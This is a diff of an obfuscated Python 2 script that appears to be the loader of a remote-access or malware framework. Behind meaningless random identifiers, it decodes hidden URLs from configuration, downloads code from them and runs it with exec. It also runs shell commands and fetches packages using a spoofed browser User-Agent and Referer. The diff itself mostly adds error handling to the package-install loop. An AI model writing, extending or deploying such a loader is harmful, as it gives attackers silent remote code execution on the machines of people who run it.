@@ -5,7 +5,7 @@ import os
 from struct import calcsize
 from imp import new_module
 from json import loads
-from urllib import urlopen
+from urllib2 import Request, urlopen
 
 
 def run(*args, **kwargs):
@@ -22,12 +22,19 @@ def run(*args, **kwargs):
             exec urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__x__'))).read() in globals()
         BloatedLionProlapse = lambda x: os.popen(' '.join(['{}'.format(i) for i in x])).read().rstrip()
         for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(calcsize('P') * 8)].items():
-            GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse([GroovySophisticatedLemur, 'install', NobleRusticWalrus])    
-            if not len(BloatedLionProlapse([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
-                with file(os.path.basename(NobleRusticWalrus), 'wb') as fp:
-                    fp.write(urlopen(NobleRusticWalrus, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.17025', 'Referer':'https://www.lfd.uci.edu/~gohlke/pythonlibs/'}).read())
-                GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', os.path.basename(NobleRusticWalrus)])
-            ChivalrousIntergalacticPlayboy = os.remove(os.path.basename(NobleRusticWalrus)) if os.path.isfile(os.path.basename(NobleRusticWalrus)) else None
+            try:
+                print 'installing', FoamyNonstopHistory
+                GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse([GroovySophisticatedLemur, 'install', NobleRusticWalrus])    
+                if not len(BloatedLionProlapse([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
+                    with file(os.path.basename(NobleRusticWalrus), 'wb') as fp:
+                        GnarledAutisticEarlobe = Request(NobleRusticWalrus)
+                        GnarledAutisticEarlobe.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.17025')
+                        GnarledAutisticEarlobe.add_header('Referer', 'https://www.lfd.uci.edu/~gohlke/pythonlibs/')
+                        fp.write(urlopen(GnarledAutisticEarlobe).read())
+                    GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', os.path.basename(NobleRusticWalrus)])
+                ChivalrousIntergalacticPlayboy = os.remove(os.path.basename(NobleRusticWalrus)) if os.path.isfile(os.path.basename(NobleRusticWalrus)) else None
+            except Exception as e:
+                print 'Error:',str(e)
     finally:
         RoundPluckyScallion = urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__w__'))).read()
         AmbiguousObedientQuestion = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__u__'))
